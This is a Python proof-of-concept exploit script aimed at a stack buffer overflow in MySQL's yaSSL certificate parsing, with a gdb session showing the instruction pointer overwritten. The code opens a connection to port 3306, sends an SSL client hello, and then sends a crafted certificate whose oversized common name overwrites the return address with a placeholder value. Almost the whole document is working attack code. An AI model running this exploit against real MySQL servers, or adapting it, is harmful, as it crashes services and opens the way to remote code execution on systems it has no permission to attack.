#!/usr/bin/env python
#
# Use this code at your own risk. Never run it against a production system.
# 
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

"""
Usage: mysql_overflo1.py localhost

MySQL yassl cert parsing stack overflow

Debug session on 5.5.0-m2

suse11:~ # gdb -q
(gdb) att 5542
Attaching to process 5542
Reading symbols from /var/mysql/libexec/mysqld...cdone.
...
0xffffe430 in __kernel_vsyscall ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0xb6bbab90 (LWP 5545)]
0x41424344 in ?? ()
(gdb)

"""
import os
import getopt
import sys
import socket
import time
import telnetlib
import struct
import base64
import random

class theexploit:
	def __init__(self,host):
		self.host = host
        	self.port = 3306 

	def gettcpsock(self):
		sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		return sock
 
	def int2berlen(self,i):
        	e=self.int2ber(i, signed=0)
        	if i <= 127:
                	return e
        	else:
                	l=len(e)
                	return chr(0x80|l) + e

	def int2ber(self,i, signed=1):
        	encoded=''
        	while ((signed and (i>127 or i<-128))
                	or (not signed and (i>255))):
                	encoded=chr(i%256)+encoded
                	i=i>>8
        	encoded=chr(i%256)+encoded
        	return encoded
 
	def big_endian_24(self, length):
        	l1 = (length & 0xff0000) >> 16;
                l2 = (length & 0xff00) >> 8;
                l3 = length & 0xff;
                size = chr(l1) + chr(l2) + chr(l3)
		return size

	def attack_mysql(self):
		sock = self.gettcpsock()
		sock.connect((self.host, self.port))
		#sock.set_timeout(30.0)		


		print "press any key"
		sys.stdin.readline()
		
		s=sock.recv(8000)
		print s

		s ="\x20\x00\x00\x01\x85\xae\x03\x00\x00\x00\x00\x01\x08\x00\x00\x00"
		s+="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                s+="\x00\x00\x00\x00"
                s+="\x16\x03\x01\x00\x60\x01\x00\x00\x5c\x03\x01\x4a\x92\xce\xd1\xe1"
                s+="\xab\x48\x51\xc8\x49\xa3\x5e\x97\x1a\xea\xc2\x99\x82\x33\x42\xd5"
                s+="\x14\xbc\x05\x64\xdc\xb5\x48\xbd\x4c\x11\x55\x00\x00\x34\x00\x39" 
                s+="\x00\x38\x00\x35\x00\x16\x00\x13\x00\x0a\x00\x33\x00\x32\x00\x2f"
                s+="\x00\x66\x00\x05\x00\x04\x00\x63\x00\x62\x00\x61\x00\x15\x00\x12"
                s+="\x00\x09\x00\x65\x00\x64\x00\x60\x00\x14\x00\x11\x00\x08\x00\x06"
                s+="\x00\x03\x02\x01\x00"

		sock.sendall(s)
		print "Sent SSL_CLIENT_HELLO"
		
		sock.sendall(self.make_overflow())
		print "Sent SSL_CLIENT_CERTIFICATE"
		sock.close()

 
    	def run(self):
		self.attack_mysql()
		return 0

	def make_overflow(self):
		retaddr=0x41424344
		cn=""
                cn += "\x00"* 1062
		cn+=struct.pack ("<L",retaddr)*6 
		#cn += "\x40" * 100
		#cn += "\xcc"*100
		#cn += "\x40" * 100

		cert = "\x2a\x86\x00\x84" + struct.pack(">L",len(cn)) + cn

		cert = "\x30\x82\x01\x01\x31\x82\x01\x01\x30\x82\x01\x01\x06\x82\x00\x02" + cert
		
		cert ="\xa0\x03\x02\x01\x02\x02\x01\x00\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x04\x05\x00" + cert

		cert = "\x30" + self.int2berlen(len(cert)) + cert
		cert = "\x30" + self.int2berlen(len(cert)) + cert
	
		cert1 = self.big_endian_24(len(cert)) + cert
		certs = self.big_endian_24(len(cert1)) + cert1
	
		handshake = "\x0b" +  self.big_endian_24(len(certs)) + certs
		msg = "\x16\x03\x01" + struct.pack(">H",len(handshake)) + handshake
		
		
		return msg 

if __name__=="__main__":
    	app = theexploit(sys.argv[1])
	app.run()
